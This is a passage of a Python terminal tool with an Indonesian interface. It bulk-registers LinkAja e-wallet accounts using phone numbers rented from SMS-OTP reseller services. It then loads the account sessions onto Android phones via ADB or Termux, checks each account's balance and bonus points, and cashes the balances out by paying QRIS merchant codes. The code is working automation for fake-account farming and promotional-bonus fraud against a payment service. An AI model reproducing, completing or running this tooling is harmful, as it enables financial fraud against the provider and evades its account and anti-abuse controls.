    max_limit = min(5, int(cfg.get("max_accounts_per_bot", cfg.get("max_accounts", 5))))
    pilihan_server = Prompt.ask("[bold cyan]>> Pilih Server API OTP[/]", choices=["1", "2", "3"], default="1")
    raw_input_akun = Prompt.ask(f"[bold cyan]>> Masukkan jumlah akun (1 - {max_limit})[/]", default=str(max_limit))
    try:
        jumlah_akun = int(raw_input_akun)
    except ValueError:
        jumlah_akun = max_limit

    if jumlah_akun > max_limit:
        console.print(f"[bold yellow][!] overload capasity l {max_limit} account.[/bold yellow]")
        jumlah_akun = max_limit
    elif jumlah_akun < 1:
        jumlah_akun = 1
    target_mulai = Prompt.ask("[bold cyan]>> Jam mulai pendaftaran (HH:MM:SS, kosong = instan)[/]", default="")
    target_kirim_data = Prompt.ask("[bold cyan]>> Jam kirim data diri (HH:MM:SS, kosong = langsung)[/]", default="")

    if pilihan_server == "3":
        api_key_sb = load_smsbower_api_key()
        base_s = "https://smsbower.page/stubs/handler_api.php"
        with console.status("[bold cyan]Menghubungi server SMSBower & memeriksa stok...[/]", spinner="line"):
            try:
                # Cek saldo SMSBower
                r_bal = requests.get(base_s, params={"api_key": api_key_sb, "action": "getBalance"}, timeout=10)
                bal_text = r_bal.text.strip()
                saldo_usd = "?"
                if "ACCESS_BALANCE:" in bal_text:
                    saldo_usd = bal_text.split(":")[1]
                elif "BAD_KEY" in bal_text:
                    console.print("\n[bold red][X] API Key SMSBower di smsbower.txt tidak valid (BAD_KEY)![/]")
                    return

                # Cek stok LinkAja pada harga $0.004
                r_v3 = requests.get(base_s, params={"api_key": api_key_sb, "action": "getPricesV3", "service": "aka", "country": 6}, timeout=10).json()
                aka_prov = r_v3.get("6", {}).get("aka", {})
                stok_004 = sum(int(p.get("count", 0)) for p in aka_prov.values() if isinstance(p, dict) and float(p.get("price", 999)) <= 0.004)
                if stok_004 <= 0:
                    console.print("\n[bold red][X] Stok SMSBower ($0.004) Kosong![/]")
                    return

                harga_info = "$0.004 (~Rp 64)"
                config_api = {
                    "api_key": api_key_sb,
                    "service_id": "aka",
                    "country_id": 6,
                    "provider_id": "any",
                    "max_price": 0.004
                }
                console.print(f"[bold green][OK] Terhubung ke SMSBower! Saldo: ${saldo_usd} | Stok $0.004: {stok_004} nomor[/]")
                time.sleep(1)
            except Exception as e:
                console.print(f"\n[bold red][X] Gagal menghubungi SMSBower: {e}[/]")
                return
    else:
        base_url = "https://otpinstan.com/api/reseller"
        base_s = f"{base_url}/s1" if pilihan_server == "1" else base_url
        headers_get = {"X-Api-Key": API_KEY_OTP}

        with console.status("[bold cyan]Menghubungi server OTPInstan & memeriksa stok...[/]", spinner="line"):
            try:
                res_c = requests.get(f"{base_s}/countries.php", headers=headers_get, timeout=10).json()
                countries = res_c.get("data", res_c) if isinstance(res_c, dict) else res_c
                if isinstance(countries, dict):
                    countries = [{"id": k, **v} if isinstance(v, dict) else v for k, v in countries.items()]
                country_id = next(
                    (c.get("id", c.get("country_id")) for c in (countries if isinstance(countries, list) else [])
                     if "indonesia" in str(c.get("name", c.get("country_name", "Unknown"))).lower()),
                    None
                )

                res_s = requests.get(
                    f"{base_s}/services.php",
                    params={"country_id": country_id} if pilihan_server == "1" else None,
                    headers=headers_get,
                    timeout=10
                ).json()
                services = res_s.get("data", res_s) if isinstance(res_s, dict) else res_s
                if isinstance(services, dict):
                    services = [{"platform_id": k, **v} if isinstance(v, dict) else v for k, v in services.items()]
                valid_services = [
                    s for s in (services if isinstance(services, list) else [])
                    if "linkaja" in str(s.get("name", s.get("service_name", ""))).lower()
                    and int(s.get("stock", s.get("count", s.get("qty", 0)))) > 0
                ]

                if not valid_services:
                    console.print("\n[bold red][X] Stok Kosong![/]")
                    return

                valid_services.sort(key=lambda x: float(x.get("price", 0)))
                service_id = valid_services[0].get("platform_id", valid_services[0].get("id", valid_services[0].get("service")))

                provider_id = "any"
                harga_info = valid_services[0].get("price", "?")

                if pilihan_server == "2":
                    res_op = requests.get(
                        f"{base_url}/operators.php",
                        params={"service": service_id, "country": country_id},
                        headers=headers_get,
                        timeout=10
                    ).json()
                    operators = res_op.get("data", res_op) if isinstance(res_op, dict) else res_op
                    valid_operators = [
                        o for o in (operators if isinstance(operators, list) else [])
                        if int(o.get("stock", o.get("count", o.get("qty", 0)))) > 0
                    ]
                    if valid_operators:
                        valid_operators.sort(key=lambda x: float(x.get("price", 0)))
                        provider_id = valid_operators[0].get("value", valid_operators[0].get("provider_id", valid_operators[0].get("id")))
                        harga_info = valid_operators[0].get('price', '?')

                config_api = {
                    "country_id": country_id,
                    "service_id": service_id,
                    "provider_id": provider_id
                }

            except Exception:
                console.print("\n[bold red][X] API Down![/]")
                return

    reset_pool_primed()
    WORKER_STATUS.clear()
    for i in range(1, jumlah_akun + 1):
        update_worker_ui(i, state="init")

    clear_once()
    threads = []
    with Live(
        render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun),
        console=console,
        auto_refresh=False
    ) as live:
        for i in range(1, jumlah_akun + 1):
            t = threading.Thread(
                target=worker_register_scheduled,
                args=(i, target_mulai, target_kirim_data, pilihan_server, config_api)
            )
            threads.append(t)
            t.start()
            time.sleep(0.05)
            live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)

        while any(t.is_alive() for t in threads):
            if WORKER_EVENT.wait(timeout=0.25):
                WORKER_EVENT.clear()
                live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)

        live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)

    console.print("\n[bold green][OK] Bulk Register Selesai![/]")
    bot_id = get_or_set_bot_id()
    auto_sort_and_sync_pool(bot_id, jumlah_akun)
    sukses = sum(1 for info in WORKER_STATUS.values() if info.get("state") == "success")
    gagal = sum(1 for info in WORKER_STATUS.values() if info.get("state") == "failed")
    summary = {
        "sukses": sukses,
        "gagal": gagal,
        "total": len(WORKER_STATUS),
        "server": str(pilihan_server),
        "timestamp": time.time(),
        "finished_at": datetime.now().strftime("%H:%M:%S")
    }
    try:
        p_last = Path(__file__).resolve().parent / "data" / "last_run.json"
        p_last.parent.mkdir(parents=True, exist_ok=True)
        p_last.write_text(json.dumps(summary, indent=2), encoding="utf-8")
    except Exception:
        pass


def run_auto_bulk(pilihan_server="3", jumlah_akun=10, target_mulai="", target_kirim_data=""):
    """Menjalankan bulk registration otomatis dari CLI / Telegram tanpa prompt interaktif."""
    pilihan_server = str(pilihan_server)
    jumlah_akun = int(jumlah_akun)
    harga_info = "?"
    config_api = {}

    if pilihan_server == "3":
        api_key_sb = load_smsbower_api_key()
        base_s = "https://smsbower.page/stubs/handler_api.php"
        try:
            r_bal = requests.get(base_s, params={"api_key": api_key_sb, "action": "getBalance"}, timeout=10)
            bal_text = r_bal.text.strip()
            saldo_usd = bal_text.split(":")[1] if "ACCESS_BALANCE:" in bal_text else "?"
            harga_info = "$0.004 (~Rp 64)"
            config_api = {
                "api_key": api_key_sb,
                "service_id": "aka",
                "country_id": 6,
                "provider_id": "any",
                "max_price": 0.004
            }
            console.print(f"[bold green][OK] Terhubung ke SMSBower! Saldo: ${saldo_usd}[/]")
        except Exception as e:
            console.print(f"[bold red][X] Gagal API SMSBower: {e}[/]")
            return
    else:
        base_url = "https://otpinstan.com/api/reseller"
        base_s = f"{base_url}/s1" if pilihan_server == "1" else base_url
        headers_get = {"X-Api-Key": API_KEY_OTP}
        try:
            res_c = requests.get(f"{base_s}/countries.php", headers=headers_get, timeout=10).json()
            countries = res_c.get("data", res_c) if isinstance(res_c, dict) else res_c
            if isinstance(countries, dict):
                countries = [{"id": k, **v} if isinstance(v, dict) else v for k, v in countries.items()]
            country_id = next(
                (c.get("id", c.get("country_id")) for c in (countries if isinstance(countries, list) else [])
                 if "indonesia" in str(c.get("name", c.get("country_name", "Unknown"))).lower()),
                None
            )
            res_s = requests.get(
                f"{base_s}/services.php",
                params={"country_id": country_id} if pilihan_server == "1" else None,
                headers=headers_get,
                timeout=10
            ).json()
            services = res_s.get("data", res_s) if isinstance(res_s, dict) else res_s
            if isinstance(services, dict):
                services = [{"platform_id": k, **v} if isinstance(v, dict) else v for k, v in services.items()]
            valid_services = [
                s for s in (services if isinstance(services, list) else [])
                if "linkaja" in str(s.get("name", s.get("service_name", ""))).lower()
                and int(s.get("stock", s.get("count", s.get("qty", 0)))) > 0
            ]
            valid_services.sort(key=lambda x: float(x.get("price", 0)))
            service_id = valid_services[0].get("platform_id", valid_services[0].get("id", valid_services[0].get("service")))
            provider_id = "any"
            harga_info = valid_services[0].get("price", "?")
            if pilihan_server == "2":
                res_op = requests.get(
                    f"{base_url}/operators.php",
                    params={"service": service_id, "country": country_id},
                    headers=headers_get,
                    timeout=10
                ).json()
                operators = res_op.get("data", res_op) if isinstance(res_op, dict) else res_op
                valid_operators = [o for o in (operators if isinstance(operators, list) else []) if int(o.get("stock", o.get("count", o.get("qty", 0)))) > 0]
                if valid_operators:
                    valid_operators.sort(key=lambda x: float(x.get("price", 0)))
                    provider_id = valid_operators[0].get("value", valid_operators[0].get("provider_id", valid_operators[0].get("id")))
                    harga_info = valid_operators[0].get("price", "?")
            config_api = {"country_id": country_id, "service_id": service_id, "provider_id": provider_id}
        except Exception as e:
            console.print(f"[bold red][X] Gagal API OTPInstan: {e}[/]")
            return

    reset_pool_primed()
    WORKER_STATUS.clear()
    for i in range(1, jumlah_akun + 1):
        update_worker_ui(i, state="init")

    clear_once()
    threads = []
    with Live(
        render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun),
        console=console,
        auto_refresh=False
    ) as live:
        for i in range(1, jumlah_akun + 1):
            t = threading.Thread(
                target=worker_register_scheduled,
                args=(i, target_mulai, target_kirim_data, pilihan_server, config_api)
            )
            threads.append(t)
            t.start()
            time.sleep(0.05)
            live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)

        while any(t.is_alive() for t in threads):
            if WORKER_EVENT.wait(timeout=0.25):
                WORKER_EVENT.clear()
                live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)

        live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)

    console.print("\n[bold green][OK] Bulk Register Selesai![/]")
    sukses = sum(1 for info in WORKER_STATUS.values() if info.get("state") == "success")
    gagal = sum(1 for info in WORKER_STATUS.values() if info.get("state") == "failed")
    summary = {
        "sukses": sukses,
        "gagal": gagal,
        "total": len(WORKER_STATUS),
        "server": str(pilihan_server),
        "timestamp": time.time(),
        "finished_at": datetime.now().strftime("%H:%M:%S")
    }
    try:
        p_last = Path(__file__).resolve().parent / "data" / "last_run.json"
        p_last.parent.mkdir(parents=True, exist_ok=True)
        p_last.write_text(json.dumps(summary, indent=2), encoding="utf-8")
    except Exception:
        pass


# ==========================================
# MENU 3: ADB PUSH (INJECT)
# ==========================================
def menu_inject():
    print_section_header(
        "[*] ADB Push Akun (Inject Khusus PC)",
        "Memasang sesi akun secara otomatis ke perangkat Android yang terhubung via ADB.",
        style="bright_cyan"
    )
    states = list_states()
    if not states:
        console.print("[yellow][!] Tidak ada akun baru di folder data/states.[/]")
        return

    from core import inject
    try:
        adb_bin = inject.find_adb()
        devs = inject.list_devices(adb_bin)
    except Exception:
        console.print("[bold red][X] Error ADB[/]")
        return

    if not devs:
        console.print("[bold red][X] Device tidak ditemukan.[/]")
        return

    total_inject = min(len(states), len(devs))
    info_table = Table(box=box.SIMPLE, show_header=False)
    info_table.add_column("Key", style="cyan")
    info_table.add_column("Val", style="bold white")
    info_table.add_row("Akun Siap Push", f"{len(states)} akun")
    info_table.add_row("Perangkat ADB Aktif", f"{len(devs)} perangkat")
    info_table.add_row("Target Eksekusi", f"[bold yellow]{total_inject} pasang[/]")
    console.print(Panel(info_table, title="[bold]Ringkasan ADB[/]", border_style="cyan", expand=False))

    if not Confirm.ask("[bold cyan]>> Mulai push otomatis?[/]", default=True):
        return

    console.print()
    with Progress(
        SpinnerColumn(spinner_name="line"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[bold cyan]{task.completed}/{task.total}[/]"),
        TimeElapsedColumn(),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Memasang akun ke perangkat...", total=total_inject)
        for i in range(total_inject):
            akun = states[i]
            serial_hp = devs[i]
            progress.update(task, description=f"[cyan][>>] HP {serial_hp} <- {akun['msisdn']}[/]")
            try:
                inject.inject_account(akun["file"], adb_serial=serial_hp, progress=lambda m: None)
                progress.console.print(f"  [green][OK] Sukses:[/] [bold]{akun['msisdn']}[/] -> [cyan]{serial_hp}[/]")
            except Exception:
                progress.console.print(f"  [red][X] Gagal :[/] [bold]{akun['msisdn']}[/] -> [cyan]{serial_hp}[/]")
            progress.advance(task)


# ==========================================
# MENU 4: CEK BONUS
# ==========================================
def proses_cek_satu_akun(akun):
    try:
        with open(akun["file"], "r") as f:
            st = json.load(f)
        jwt = st.get("jwt")
        rt = st.get("refreshToken")
        if not jwt:
            return "0", "0", "[red]No Token[/]"

        sess = (st["ident"], st["shared"])
        token_auth = f"Bearer {jwt}"

        res_bal = api_get(sess, "/user/balance", token=token_auth)
        data_bal = decrypt_resp(res_bal, st) if res_bal.status_code == 200 else {}

        if res_bal.status_code == 401 or data_bal.get("status") != "00":
            if not rt:
                return "0", "0", "[red]Sesi Mati[/]"
            res_ref = api_post(sess, "/auth/session/refresh", {"token": jwt, "refreshToken": rt})
            data_ref = decrypt_resp(res_ref, st) if res_ref.status_code == 200 else {}

            if data_ref.get("status") == "00":
                jwt = data_ref["data"]["token"]
                rt = data_ref["data"]["refreshToken"]
                st["jwt"] = jwt
                st["refreshToken"] = rt
                with open(akun["file"], "w") as f:
                    json.dump(st, f, ensure_ascii=False, indent=2)
                token_auth = f"Bearer {jwt}"
                res_bal = api_get(sess, "/user/balance", token=token_auth)
                data_bal = decrypt_resp(res_bal, st) if res_bal.status_code == 200 else {}
            else:
                return "0", "0", "[red]Refresh Gagal[/]"

        raw_bal = data_bal.get("data", {}).get("value", "0") if isinstance(data_bal.get("data"), dict) else "0"
        saldo_utama = "".join(filter(str.isdigit, str(raw_bal))) or "0"

        res_pt = api_get(sess, "/user/point", token=token_auth)
        data_pt = decrypt_resp(res_pt, st) if res_pt.status_code == 200 else {}

        raw_pt = data_pt.get("data", {}).get("total", "0") if isinstance(data_pt.get("data"), dict) else "0"
        bonus_poin = "".join(filter(str.isdigit, str(raw_pt))) or "0"

        status_msg = "[bold bright_green][+] Masuk![/]" if int(bonus_poin) >= 5000 else "[bright_yellow]Zonk[/]"
        return saldo_utama, bonus_poin, status_msg

    except Exception:
        return "-", "-", "[red]Error[/]"

def menu_cek_saldo():
    print_section_header("[*] Cek Bonus", style="bright_green")
    if not CRYPTO_AVAILABLE:
        console.print("[bold red][X] Library pycryptodome belum diinstall.[/red]")
        return

    states = list_states()
    if not states:
        console.print("[yellow][!] Folder states kosong.[/]")
        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
        return

    table = Table(
        box=box.ROUNDED,
        header_style="bold bright_white on dark_blue",
        border_style="bright_cyan",
        expand=False,
    )
    table.add_column("No", style="bright_cyan", justify="center", width=4)
    table.add_column("Nomor", style="bright_green", width=15)
    table.add_column("Saldo", justify="right", style="bright_yellow", width=12)
    table.add_column("Bonus", justify="right", style="bright_magenta", width=12)
    table.add_column("Status", justify="center", width=12)

    jml_masuk = 0
    jml_zonk = 0
    jml_err = 0

    with Live(table, console=console, refresh_per_second=1):
        for idx, akun in enumerate(states, start=1):
            saldo_utama, bonus_poin, status_msg = proses_cek_satu_akun(akun)
            if "Masuk" in status_msg:
                jml_masuk += 1
            elif "Zonk" in status_msg:
                jml_zonk += 1
            else:
                jml_err += 1

            fmt_saldo = f"Rp {int(saldo_utama):,}".replace(",", ".") if saldo_utama.isdigit() else f"Rp {saldo_utama}"
            fmt_poin = f"{int(bonus_poin):,} pts".replace(",", ".") if bonus_poin.isdigit() else f"{bonus_poin} pts"

            table.add_row(str(idx), akun.get("msisdn", "?"), fmt_saldo, fmt_poin, status_msg)
            time.sleep(0.2)

    console.print(
        Panel(
            f"[bold white]Total:[/] {len(states)}  |  "
            f"[bold bright_green]Masuk:[/] {jml_masuk}  |  "
            f"[bold yellow]Zonk:[/] {jml_zonk}  |  "
            f"[bold red]Error:[/] {jml_err}",
            border_style="bright_cyan",
            box=box.ROUNDED,
            expand=False,
        )
    )
    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")


# ==========================================
# MENU 5: RESTORE / INJECT TERMUX
# ==========================================
# MENU 5: RESTORE / INJECT TERMUX
# ==========================================
def menu_injeck_termux():
    print_section_header("[*] Restore Termux", style="bright_magenta")

    if not CRYPTO_AVAILABLE:
        console.print("[bold red][X] pycryptodome belum diinstall.[/red]")
        return

    states = list_states()
    if not states:
        console.print("[yellow][!] data/states kosong.[/]")
        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
        return

    akun_target = states[0]["file"]
    nomor = states[0].get("msisdn", "?")

    console.print(
        Panel(
            f"[bold white]Target:[/] [bold bright_green]{nomor}[/]  |  [bold white]Sisa:[/] [cyan]{len(states)} akun[/]",
            border_style="magenta",
            box=box.ROUNDED,
            expand=False,
        )
    )

    if not Confirm.ask("[bold magenta]>> Inject sekarang?[/]", default=True):
        return

    console.print()
    try:
        inject_termux_account(akun_target)
    except InjectError as e:
        console.print(f"\n[bold red][X] Gagal: {e}[/]")
    except Exception as e:
        console.print(f"\n[bold red][X] Error: {e}[/]")
    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")


# ==========================================
# MENU 6: SORTIR AKUN
# ==========================================
def menu_sortir():
    print_section_header("[*] Sortir Akun", style="bright_yellow")

    if not CRYPTO_AVAILABLE:
        console.print("[bold red][X] pycryptodome belum diinstall.[/red]")
        return

    states = list_states()
    if not states:
        console.print("[yellow][!] data/states kosong.[/]")
        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
        return

    dir_base = Path(__file__).resolve().parent / "data"
    dir_zonk = dir_base / "states_zonk"
    dir_zonk.mkdir(parents=True, exist_ok=True)

    count_bonus = 0
    count_zonk = 0
    count_error = 0

    with Progress(
        SpinnerColumn(spinner_name="line"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[bold cyan]{task.completed}/{task.total}[/]"),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Sortir akun...", total=len(states))

        for akun in states:
            file_path = Path(akun["file"])
            if not file_path.exists():
                progress.advance(task)
                continue

            msisdn = akun.get("msisdn", "?")
            progress.update(task, description=f"[cyan]Cek {msisdn}...[/]")

            saldo_utama, bonus_poin, status_msg = proses_cek_satu_akun(akun)

            if bonus_poin == "-" or "Error" in status_msg or "Sesi Mati" in status_msg:
                progress.console.print(f"  [red][X] {msisdn}[/] -> Error")
                count_error += 1
                progress.advance(task)
                continue

            poin_int = int(bonus_poin) if str(bonus_poin).isdigit() else 0

            try:
                if poin_int >= 5000:
                    progress.console.print(f"  [green][OK] {msisdn}[/] -> Bonus {poin_int:,}")
                    count_bonus += 1
                else:
                    shutil.move(str(file_path), str(dir_zonk / file_path.name))
                    progress.console.print(f"  [yellow][!] {msisdn}[/] -> Zonk ({poin_int:,})")
                    count_zonk += 1
            except Exception as e:
                progress.console.print(f"  [red][X] {msisdn}: {e}[/]")

            progress.advance(task)
            time.sleep(0.2)

    console.print(
        Panel(
            f"[bold green]Bonus (>= 5k):[/] {count_bonus}  |  "
            f"[bold yellow]Zonk (< 5k):[/] {count_zonk}  |  "
            f"[bold red]Error:[/] {count_error}",
            title="[bold green]Selesai[/]",
            border_style="bright_green",
            expand=False
        )
    )
    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")


# ==========================================
# MENU 7: FITUR DALAM PENGEMBANGAN
# ==========================================
def menu_fitur_segera(nama_fitur: str):
    print_section_header(f"[*] {nama_fitur}", style="bright_yellow")
    console.print(f"[dim yellow]Fitur {nama_fitur} segera hadir.[/]")
    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")


# ==========================================
# MENU 8: SCAN BONUS & CASHOUT QRIS
# ==========================================
def menu_scan_bonus():
    print_section_header("[*] Scan QRIS", style="bright_yellow")

    states = list_states()
    if not states:
        console.print("[yellow][!] data/states kosong.[/]")
        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
        return

    akun_siap = []
    with Progress(
        SpinnerColumn(spinner_name="line"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[bold cyan]{task.completed}/{task.total}[/]"),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Cek saldo...", total=len(states))
        for akun in states:
            msisdn = akun.get("msisdn", "?")
            progress.update(task, description=f"[cyan]Cek {msisdn}...[/]")
            saldo_str, poin_str, st_msg = proses_cek_satu_akun(akun)
            s_val = int(saldo_str) if str(saldo_str).isdigit() else 0
            p_val = int(poin_str) if str(poin_str).isdigit() else 0
            total_val = s_val + p_val

            if total_val > 0:
                akun_data = dict(akun)
                akun_data["saldo"] = s_val
                akun_data["bonus"] = p_val
                akun_data["total"] = total_val
                akun_siap.append(akun_data)

            progress.advance(task)

    if not akun_siap:
        console.print("\n[bold red][X] Tidak ada akun dengan saldo (semua 0 / zonk).[/]")
        Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali...[/]")
        return

    akun_siap.sort(key=lambda a: -a["total"])

    table_siap = Table(show_header=True, header_style="bold bright_cyan", box=box.SIMPLE_HEAD, padding=(0, 2))
    table_siap.add_column("No", justify="center", style="bold yellow", width=4)
    table_siap.add_column("Nomor HP", style="bright_white", width=15)
    table_siap.add_column("Nama", style="dim", width=18)
    table_siap.add_column("Bonus", justify="right", style="bold green", width=11)
    table_siap.add_column("Utama", justify="right", style="bold yellow", width=11)
    table_siap.add_column("Total", justify="right", style="bold bright_green", width=13)

    total_pool = 0
    for idx, ak in enumerate(akun_siap, 1):
        total_pool += ak["total"]
        table_siap.add_row(
            str(idx),
            ak["msisdn"],
            ak.get("fullname", "User")[:16],
            f"Rp {ak['bonus']:,}",
            f"Rp {ak['saldo']:,}",
            f"Rp {ak['total']:,}"
        )

    console.print()
    console.print(
        Panel(
            table_siap,
            title=f"[bold bright_yellow][*] Akun Siap Cair ({len(akun_siap)} Akun | Total Rp {total_pool:,})[/]",
            border_style="bright_cyan",
            box=box.ROUNDED,
            expand=False
        )
    )

    if not Confirm.ask("\n[bold cyan]>> Mulai eksekusi QRIS?[/]", default=True):
        return

    total_sukses = 0
    total_gagal = 0
    total_uang_cair = 0
    cached_static_qr = ""

    try:
        for idx, akun in enumerate(akun_siap, 1):
            clear_once()
            print_section_header(f"[*] QRIS — Akun [{idx}/{len(akun_siap)}]", style="bright_yellow")

            info_box = (
                f"[bold white]{akun['msisdn']}[/] ({akun.get('fullname', 'User')}) | "
                f"[bold green]Bonus:[/] Rp {akun['bonus']:,} | "
                f"[bold yellow]Utama:[/] Rp {akun['saldo']:,} | "
                f"[bold bright_green]Total:[/] Rp {akun['total']:,}"
            )
            console.print(Panel(info_box, border_style="bright_cyan", box=box.ROUNDED, padding=(0, 2)))
            console.print("[dim]Ketik 's' lewati | Ctrl+C selesai[/]\n")

            while True:
                prompt_text = "[bold bright_yellow]>> Paste QR[/]"
                if cached_static_qr:
                    prompt_text = "[bold bright_yellow]>> Paste QR (Enter = pakai QR Statis sebelumnya)[/]"

                try:
                    raw_input = Prompt.ask(prompt_text, default="USE_CACHED" if cached_static_qr else "").strip()
                except (KeyboardInterrupt, EOFError):
                    raise KeyboardInterrupt

                if raw_input == "USE_CACHED":
                    raw_input = cached_static_qr

                if not raw_input:
                    continue
                if raw_input.lower() == "s":
                    console.print("[yellow][*] Dilewati.[/]")
                    time.sleep(1)
                    break
                if raw_input.lower() in ("q", "quit", "exit"):
                    raise KeyboardInterrupt

                info_qr = qris.inspect_qr(raw_input)
                if not info_qr["ok"]:
                    console.print(f"[red][X] QR Tidak Valid:[/] {info_qr.get('err', 'CRC Error')}")
                    continue

                merchant_qr = info_qr.get("merchant", "Merchant")
                is_dyn = info_qr.get("dynamic", False)
                nominal_bayar = 0

                if is_dyn:
                    # QRIS Dinamis (Nominal sudah ada di QR)
                    nominal_bayar = float(info_qr.get("amount_tag54") or 0)
                    console.print(f"  [dim]Dinamis:[/] [cyan]{merchant_qr}[/] [dim]| Tagihan:[/] [bold green]Rp {int(nominal_bayar):,}[/]")
                    if nominal_bayar > akun["total"]:
                        console.print(f"[red][X] Tagihan Rp {int(nominal_bayar):,} melebihi saldo Rp {akun['total']:,}![/]")
                        continue
                else:
                    # QRIS Statis (Nominal bebas / kita tentukan sendiri)
                    console.print(f"  [dim]Statis:[/] [cyan]{merchant_qr}[/] [dim]| Bebas Nominal[/]")
                    cached_static_qr = raw_input  # Simpan agar bisa langsung dipakai untuk akun berikutnya
                    
                    default_nom = akun["total"]
                    nom_in = Prompt.ask(
                        f"  [bold yellow]>> Nominal bayar[/]",
                        default=str(default_nom)
                    ).strip()
                    try:
                        nominal_bayar = float(int("".join(filter(str.isdigit, nom_in))))
                    except ValueError:
                        nominal_bayar = float(default_nom)

                    if nominal_bayar <= 0:
                        console.print("[red][X] Nominal harus > 0.[/]")
                        continue
                    if nominal_bayar > akun["total"]:
                        console.print(f"[red][X] Nominal Rp {int(nominal_bayar):,} melebihi saldo Rp {akun['total']:,}![/]")
                        continue

                # Eksekusi pembayaran ke LinkAja
                with console.status("[bold cyan]Memproses pembayaran...[/]", spinner="line"):
                    ok, msg, detail = qris.pay_account_qris(
                        akun["file"],
                        raw_input,
                        pin_fallback=PIN_KUNCI,
                        custom_amount=nominal_bayar
                    )

                if ok:
                    total_sukses += 1
                    nom_dibayar = detail.get("nominal", nominal_bayar)
                    total_uang_cair += nom_dibayar
                    m_res = detail.get("merchant", merchant_qr)
                    trx_id = detail.get("transactionId", "-")
                    b_bonus = detail.get("bonbal_used", 0)
                    b_utama = detail.get("balance_used", 0)

                    sukses_msg = (
                        f"[bold green]BERHASIL DIBAYAR![/]\n"
                        f"[bold white]{m_res}[/] | [bold bright_green]Rp {int(nom_dibayar):,}[/] "
                        f"[dim](Bonus: Rp {int(b_bonus):,} | Utama: Rp {int(b_utama):,})[/]"
                    )
                    console.print()
                    console.print(Panel(sukses_msg, border_style="bright_green", box=box.ROUNDED))
                    time.sleep(1.5)
                    break
                else:
                    total_gagal += 1
                    console.print()
                    if detail.get("gantung"):
                        sisa_u = int(detail.get("saldo_utama_sisa", 0))
                        gantung_msg = (
                            f"[bold yellow][!] TRANSAKSI GANTUNG (60010011)[/]\n"
                            f"{msg}\n"
                            f"[bold white]Saldo Utama Masih Utuh:[/] [bold bright_green]Rp {sisa_u:,}[/]\n"
                            f"[dim]Tarik sisa saldo dengan QR nominal pas Rp {sisa_u:,}[/]"
                        )
                        console.print(Panel(gantung_msg, border_style="bright_yellow", box=box.ROUNDED))
                    else:
                        console.print(Panel(f"[bold red][X] Gagal:[/] {msg}", border_style="bright_red", box=box.ROUNDED))

                    if not Confirm.ask(">> Coba lagi untuk akun ini?", default=False):
                        break

    except KeyboardInterrupt:
        console.print("\n\n[bold yellow][!] Dihentikan (Ctrl+C).[/]")

    # Ringkasan Akhir
    console.print()
    ringkasan = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
    ringkasan.add_column("Keterangan", style="bold")
    ringkasan.add_column("Nilai", justify="right")
    ringkasan.add_row("[bold green]Sukses[/]", f"{total_sukses} akun")
    ringkasan.add_row("[bold red]Gagal / Lewat[/]", f"{total_gagal} akun")
    ringkasan.add_row("[bold bright_green]Total Cair[/]", f"Rp {int(total_uang_cair):,}")

    console.print(
        Panel(
            ringkasan,
            title="[bold bright_yellow][*] RINGKASAN[/]",
            border_style="bright_green",
            box=box.ROUNDED,
            expand=False
        )
    )
    Prompt.ask("\n[dim cyan]Tekan Enter untuk kembali ke menu...[/]")


# ==========================================
# MASTER UI / MENU UTAMA
# ==========================================
def render_dashboard_header():
    console.print(
        Panel(
            "[bold bright_yellow][ MESIN GRADAKKKKK v4.5 - MUMET EDITION ][/]\n"
            "[dim]High-Speed Multi-Worker Engine · 0% Idle CPU · RAM Offload[/]",
            border_style="bright_yellow",
            box=box.ROUNDED,
            padding=(0, 2)
        )
    )

def menu_ganti_api_key():
    print_section_header("[*] Pengaturan API Key", "Ubah API Key OTPInstan atau SMSBower", style="bright_yellow")
    console.print(
        "[bold cyan]Pilih API Key yang ingin diganti:[/]\n"
        "  [bold bright_white]1.[/] API Key OTPInstan (api.txt)\n"
        "  [bold bright_white]2.[/] API Key SMSBower  (smsbower.txt)\n"
        "  [bold bright_white]0.[/] Kembali\n"
    )
    pilih = Prompt.ask("[bold cyan]>> Pilih[/]", choices=["1", "2", "0"], default="0")
    if pilih == "1":
        cur_key = ""
        if os.path.exists("api.txt"):
            with open("api.txt", "r") as f:
                cur_key = f.read().strip()
        disp = f"{cur_key[:6]}...{cur_key[-4:]}" if len(cur_key) > 10 else (cur_key or "Kosong")
        console.print(f"[dim]Key saat ini: {disp}[/]")
        new_k = Prompt.ask("[bold cyan]>> Masukkan API Key OTPInstan baru[/]").strip()
        if new_k:
            with open("api.txt", "w") as f:
                f.write(new_k)
            global API_KEY_OTP
            API_KEY_OTP = new_k
            console.print("[bold green][OK] API Key OTPInstan berhasil disimpan ke api.txt![/]\n")
            time.sleep(1.5)
    elif pilih == "2":
        cur_key = ""
        if os.path.exists("smsbower.txt"):
            with open("smsbower.txt", "r", encoding="utf-8") as f:
                cur_key = f.read().strip()
        disp = f"{cur_key[:6]}...{cur_key[-4:]}" if len(cur_key) > 10 else (cur_key or "Kosong")
